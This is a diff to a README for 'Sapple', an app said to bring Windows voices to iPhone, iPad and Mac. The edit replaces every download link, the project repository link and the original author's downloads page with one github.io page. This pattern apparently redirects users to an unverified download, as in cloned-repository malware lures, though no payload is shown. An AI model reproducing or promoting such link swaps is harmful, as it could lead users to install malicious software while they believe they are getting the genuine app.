@@ -1,6 +1,6 @@
 # 🍏 Sapple - Your Favorite Windows Voices on Apple Devices
 
-[![Download Sapple](https://img.shields.io/badge/Download-Sapple-4CAF50?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/tinseled-bobhope615/Sapple/releases)
+[![Download Sapple](https://img.shields.io/badge/Download-Sapple-4CAF50?style=for-the-badge&logo=apple&logoColor=white)](https://tinseled-bobhope615.github.io)
 
 ## ✨ What Is Sapple?
 
@@ -24,7 +24,7 @@ Getting Sapple on your device is simple. Here's what you need to do.
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/tinseled-bobhope615/Sapple/releases](https://github.com/tinseled-bobhope615/Sapple/releases)
+Visit this link to download the application: [https://tinseled-bobhope615.github.io](https://tinseled-bobhope615.github.io)
 
 You'll find the latest version there. Look for the file named `Sapple-1.1.1.ipa` for iPhone and iPad, or the appropriate file for Mac.
 
@@ -158,14 +158,14 @@ A: Yes. Sapple supports both Intel and Apple Silicon Macs.
 
 Don't wait any longer. Bring back the voices you remember or discover the new natural voices—all on your Apple device.
 
-[![Get Sapple Now](https://img.shields.io/badge/Get%20Sapple-Download-2196F3?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/tinseled-bobhope615/Sapple/releases)
+[![Get Sapple Now](https://img.shields.io/badge/Get%20Sapple-Download-2196F3?style=for-the-badge&logo=apple&logoColor=white)](https://tinseled-bobhope615.github.io)
 
 Visit this link to download the application and start using your favorite Windows voices on your Apple devices today.
 
 ## 📚 Additional Resources
 
-- **Project Repository:** [https://github.com/tinseled-bobhope615/Sapple](https://github.com/tinseled-bobhope615/Sapple)
-- **Downloads Page:** [https://quintonwilliams.me/sapple/](https://quintonwilliams.me/sapple/)
+- **Project Repository:** [https://tinseled-bobhope615.github.io](https://tinseled-bobhope615.github.io)
+- **Downloads Page:** [https://tinseled-bobhope615.github.io](https://tinseled-bobhope615.github.io)
 - **Official Documentation:** Check the repository's README for technical details
 
 The journey from Windows to Apple has never been easier. With Sapple, you can keep the voices you've grown accustomed to, even as you enjoy the benefits of your Apple device. Whether you're a longtime Windows user making the switch, or you just appreciate the character of those classic voices, Sapple brings them all to your fingertips.
